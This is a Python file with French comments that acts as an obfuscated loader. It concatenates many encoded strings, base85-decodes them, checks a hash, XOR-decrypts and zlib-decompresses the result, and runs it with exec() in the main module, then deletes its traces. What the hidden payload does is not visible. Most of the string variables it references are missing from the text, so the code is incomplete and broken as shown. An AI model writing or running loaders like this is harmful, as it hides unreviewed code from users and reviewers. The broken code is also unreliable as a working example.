_ckAVbLmYZOAwTM = 'ROT!kU|d6;xAbU=~Npm?i_zfR=JY!Q|f2=LNUn%O5}`N9&brT1{9m>*F+Z'
_cd08NKNCME2Mm4 = 'Lkoi{FBdN5@w=?4j$|tRdgd5YgLa$__!10(Dy8c=T!TGKjHo~00AmwQGNv'
_clFpLcuwwL0j4J = '&31O+)+@iJ!RhpU}UY9O6PZ(Ahc69{C%KR_(6+2oN^LTHt$*qEMb4c9>A9'
_csLjCtaDOzZ3VT = 'ywD~|`lr$Y$L_)Na}F@tC)R5@oT<kRwnD;zz$`fyC@q6Q+%A@3NKk4C5UR'
_ccSNOP7EkcIhv2 = 'o$@4Ks-4PaCOc0JK)#&Bxx(<PnLbCV$pw0%M!wVrLX->_$?Q~WklyCCLQU'
_cp5YJUJG4KeNwA = 'EWt&gBy{l!TWNAn}74X)cF>Y6cpwk^6}AWHjHcZht`+*R*9+0jc!)XCe&{'
_cl2abXxced69Yc = 'OnYLg!vjd)hKg=nW'

_pyzFwc23UFnSez = __import__('base64').b85decode(_cpHpxdvGA9buSX + _crLW2DqyU_Ralc + _ciC1x5ZIOV3Zcg + _cgFu_oLNFz7k2c + _cwE1nR6XcbR2Nh + _cfFsWxyMHhIzA5 + _caJu_Iko6p8mAZ + _ciHoJ66XqI7zaj + _c_Q1eg_cqWvnIS + _ccQR4NLtcxOmG9 + _csia9CbuZNFah1 + _cmVaIw6u7VzIkc + _ciVvA6dhdjqHT3 + _cnqv9w00xYh2y6 + _cveagFVvAuyug8 + _ck7e3qrbfQuPPQ + _cujGxEKxBvWaMB + _cr5VMVmHFQWidO + _cf4bl6ZKhEcR2j + _cv2dKpjXlv281Z + _cywKHC29RNLQQj + _cnk6bfX179HNpJ + _cl_32cZGxfNCYx + _c_esyI1sqOi_cP + _cin3RLssmDyEz_ + _cv73ap2Cp8HKM2 + _cyJBOFk8xigJfS + _cvl8kDkSawwSA0 + _cvRs5EltG87dI8 + _cdKwrDKBtm5zZa + _cyRQRXI9k7xJSJ + _cgrVaoNb0e1d6x + _cxAZqmbk7jhsFy + _cvHe_08OsvZaxz + _cdHRqM5NC5MfvO + _cqE86QEB0jTjTx + _cjg2Cs8IY_w61x + _cn4GVsgbsFDsNv + _cq9uFRER6danaT + _coemR7gfttoZDa + _cnRAGCa0zcizTM + _czb2GhmWuwx0mk + _clm0bwg3fe4Jo_ + _ccH7t0ZGJ_vTkj + _ctGY3gwbasYw9x + _csUWdz7mjqS2xx + _ctKIxMESBXhhix + _chYALR7Pk07sV1 + _ct5He8mcXuTpMt + _cx60EmGLS0mPbi + _cd2uRUR4IbG70Z + _cthYEiq1LPihE0 + _cdVqR8dcX_41eY + _cvnOLQcRRxZv_T + _cevK5YKNprhKts + _ciYE5RQQOBsgUc + _c_thFAtC9g4_Ib + _cl4FskLw9VwWsi + _ccOfHI3zRnvRAp + _cns6jlq90ERleI + _cpreGKDSFaHOQv + _cvqaqeMT4J1pmi + _cgVtr_utL8DIhC + _cqFuhlQKf3KF5a + _cyaSDiOmaDDf25 + _crWQGye8dBME7c + _ch3IyBb3MI8TyO + _cgEl1JeI6EnQYw + _cqByteTHniEuw3 + _cnqS72bqip9o6Y + _cmHC6ooUP5ygSe + _cjVlxiy66bYzFV + _czyDy8Iiw6LDKp + _ciLNj_mX5EKqD4 + _ceTWgbpDQMqlFq + _cl5EVgdNVgweKQ + _cq17RJplcGf_D6 + _cekZX7_0aurTTl + _c_Tm8JpPCdJyKe + _c_Xq4VPsHAa7ha + _cx9hM45akOXgsO + _csY4j1NLp35x4V + _caX2uCA5ITCH5q + _cbyIsBMa3y_5Kp + _ctTEIGVBOL9EHf + _cgBd8m9sv2W9ec + _cdzQEdEhHw0kyg + _c_7LYDy2hZxFpH + _cqwPcOsxun1YRf + _ciWDtf9xPxDVhb + _ckKxRaTLAKMjr0 + _ch7CgNcxs7QFIt + _cy3K4yrYdWWImu + _cfLh1fn_eiuRH0 + _clpZbFfBSuN7e2 + _cbFD1AOr4wbEDx + _ceGCfUIrlY6dmb + _cfrKQnPFT7TOlv + _ck659g0ro6xciN + _cm2aaSFzZLzCOq + _cuMJ3oEfRKIaLO + _cwk2OZGTH4EqPW + _clOMWkifhSn9Jj + _cu8QRqRh3Cyy02 + _cfe17jMoMOmwFH + _cb34Xo7GpQbvLY + _cdMqm_mtBXUFc_ + _ce8ZfjIyH9Nj8M + _c_h0kmLKME603B + _czRcRB0HgyAvW_ + _cikiAfsAWOkmiL + _cthfJ8gDdP9Epy + _chJxsXqqra4GcE + _cxGob0LnhvoMTr + _ccnE6OqEDFkWav + _cahrRuHDJ5LiZX + _cfqEbZC9I7f8u9 + _cab4qHKYjE73XD + _cl9UohnZbm_lrL + _cni6TWXFYF7hPk + _cnRNB3RHSrdG4c + _co3ndk3_USwzLt + _cjMCgnunJZIgUX + _cfCW2_u1grdtfD + _cxMopPrYZgRwDk + _cdcBHcyD8yTrsN + _cj7ZqXEju74U3N + _cgPGWhnYYMJiUJ + _cmQ2lfRrQps1RY + _cfVzTAPg_vMgRW + _cdOrgphChNpSTQ + _chAA9xLtOIDEQn + _ciphLs6os1kQP8 + _chMn0LvAK3qQRw + _ccpZhOMrIgSmpA + _cbhihuFEit_GVe + _cwU3O9ktNRgQ2R + _ch3NjJdSDsZey1 + _ctJhA1jQdC2qLi + _cln2SJNPX1aQZD + _cvRQc7t6hecQMc + _cwRzpW6UjyK1I8 + _cqDG8SMBMM1SKI + _cdUeh3PFLrgss7 + _cqC_uq7Z8nyIS_ + _ctu1KvjU04gS8V + _ceNgTmFgMrZyS5 + _caAtsJjAGCi3iD + _coJsOof18ZmKeS + _cww9wFdPSmP5jZ + _cmop70MR8wb4sE + _ctPRol75ZnGHxp + _c_m1nUpnvzrTs8 + _cxMeH0ydgXXw4E + _ceWNlGpuTXscQq + _cdl1BlgNPUv3zy + _cqgBhfHDvsXSQ1 + _cb03dVt7trY5iA + _ctpa40ByPraL41 + _cv2EKkpL_YC324 + _clkWHkBoBIa_gm + _cil5eTPFVtOIwl + _cdo40MJLZ0Qk7e + _cbpm0WPKzPFi8P + _clRqtjXVTHatQ0 + _c_N9XcSSrt_bon + _csYI1zFB28PWKQ + _cznqq8zxVQ_P86 + _ctcZFugR9AitUw + _cb9AH55NGDnWoS + _ckwyEkBP72SApr + _czONNUgZtd08tI + _cmbQeS6lSpzCv2 + _cgY6snDarc_CQB + _cchD6jk1S5OhRp + _cx_grB30BMaR2y + _cn4W3fRAY8bUz9 + _cwqkTMxmHQ7p6B + _cgxRBze6Gm3ZND + _cnIQ01arkAQ0Ah + _cmfsVxliTstXP1 + _cgNdECy76Ioxd7 + _cw_QYtIaQrVqMW + _cm0lJhguPmBxtx + _ch29PeKrFYNZq2 + _cgLT6lqAo9fjIR + _ccjPHd2BQj_su9 + _ckAVbLmYZOAwTM + _cd08NKNCME2Mm4 + _clFpLcuwwL0j4J + _csLjCtaDOzZ3VT + _ccSNOP7EkcIhv2 + _cp5YJUJG4KeNwA + _cl2abXxced69Yc)
if __import__('hashlib').sha256(_pyzFwc23UFnSez).hexdigest() != 'fbd5bc8fc11bc658bf380d62906d77a19bb88290b841bad41166d248fd1e3c74':
    __import__('sys').exit(1)
_xu653Z4CzLd81g = bytes([168, 61, 124, 198, 121, 118, 182, 192, 172, 18, 99, 164, 172, 107, 18, 78, 105, 29, 31, 72, 6, 231, 97, 131, 46, 159, 33, 201, 151, 25])
_fk_NascGVUTz3Lx = bytes([95, 172, 17, 57, 229, 153, 66, 5, 230, 218, 63, 184, 175, 159, 197, 152, 76, 246, 27, 8, 85, 54, 66, 94, 184, 73, 106, 57, 38, 200])

def _fx_sZMJyDMCAZsT(_bsmMmCJ64HTkJI, _kbdkzhp4PSw9mY):
    return bytes(_bsmMmCJ64HTkJI[_i_Jc6_s2R5WDRM] ^ _kbdkzhp4PSw9mY[_i_Jc6_s2R5WDRM % len(_kbdkzhp4PSw9mY)] for _i_Jc6_s2R5WDRM in range(len(_bsmMmCJ64HTkJI)))

def _fdwRwbwZylSGuSv(_tbf5ecSkV7Z4A6):
    import zlib
    return zlib.decompress(_tbf5ecSkV7Z4A6) # Un seul niveau de zlib ici pour simplifier

def _feg_Ojd1MrRBFF7():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xaOslJMrtRqvI5 = _fx_sZMJyDMCAZsT(_pyzFwc23UFnSez, _xu653Z4CzLd81g)
    # 2. Décompression Zlib
    _dkk9sS1lWJNKKn = _fdwRwbwZylSGuSv(_xaOslJMrtRqvI5)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dkk9sS1lWJNKKn.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nhl4nBlvTyvLnB = _main.__dict__
    _nhl4nBlvTyvLnB.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nhl4nBlvTyvLnB)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feg_Ojd1MrRBFF7()
try:
    del _fx_sZMJyDMCAZsT, _fdwRwbwZylSGuSv, _feg_Ojd1MrRBFF7
    del _pyzFwc23UFnSez, _xu653Z4CzLd81g, _fk_NascGVUTz3Lx
except:
    pass
